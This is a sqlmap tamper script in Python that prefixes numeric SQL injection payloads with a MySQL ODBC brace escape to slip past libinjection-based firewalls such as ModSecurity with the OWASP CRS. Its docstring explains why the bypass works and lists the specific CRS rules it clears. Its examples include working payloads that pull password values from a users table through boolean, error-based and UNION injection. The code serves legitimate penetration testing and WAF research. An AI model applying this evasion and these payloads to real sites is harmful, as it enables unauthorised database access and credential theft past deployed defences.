#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Prepends a (MySQL) ODBC escape sequence to a numeric payload (e.g. -1 UNION ... -> {x !0}*-1 UNION ...)

    Requirement:
        * MySQL
        * MariaDB

    Tested against:
        * MySQL 5.5.62, 5.7.44, 8.0.46, 8.4.9
        * MariaDB 10.7.8, 10.11.14, 11.8.8

    Notes:
        * Useful to bypass web application firewalls using libinjection (e.g. ModSecurity with
          the OWASP CRS), still effective against libinjection 4.0.0
        * Verified against ModSecurity v3 with the OWASP CRS (paranoia level 1, blocking mode),
          where it takes the boolean-based and error-based payloads down to 0 anomaly points
          and they are answered with HTTP 200, on all of MySQL 5.5-9.4, Percona and
          MariaDB 10.7-12.0, e.g.
            {x !0}*1 AND SUBSTR((SELECT pw FROM users LIMIT 1),1,1)=0x73
            {x !0}*1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT pw FROM users LIMIT 1)))
          Time-based payloads are not helped, as SLEEP() is matched by a separate rule
        * MySQL accepts the undocumented ODBC escape sequence '{<identifier> <expr>}' as a plain
          expression anywhere an expression is allowed, discarding the identifier, hence
          '{x !0}' is simply 1 and '{x !0}*<num>' preserves the original numeric value
        * libinjection folds away a left brace followed by a bareword ("weird ODBC / MYSQL
          {foo expr} --> expr") and restarts folding, so the fingerprint of the remaining
          payload no longer matches its database and the whole payload is rated benign
        * The inner expression has to start with an unary operator, as '{x 1}' is still being
          detected, while '{x !0}' is not
        * The brace has to lead the payload, hence only payloads starting with a number are
          being processed (i.e. numeric injection points), while payloads starting with a
          quote character are deliberately left untouched, as those are still being detected
        * Against ModSecurity with the OWASP CRS this additionally clears rule 942360
          '^[\\W\\d]+\\s*?<keyword>', as the leading '{' is followed by a word character.
          Combine it with tamper script 'uniontable' (which clears 942270) to get a UNION
          payload through: --tamper=uniontable,odbcbrace

    >>> tamper('-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -')
    '{x !0}*-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL-- -'
    >>> tamper('1 AND 5=5')
    '{x !0}*1 AND 5=5'
    >>> tamper('1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT pw FROM users LIMIT 1)))')
    '{x !0}*1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT pw FROM users LIMIT 1)))'
    >>> tamper('-4162 OR 1=1#')
    '{x !0}*-4162 OR 1=1#'
    >>> tamper("' UNION ALL SELECT NULL-- -")
    "' UNION ALL SELECT NULL-- -"
    """

    return re.sub(r"\A(?P<num>[+-]?\d+)(?![\w.])", r"{x !0}*\g<num>", payload) if payload else payload
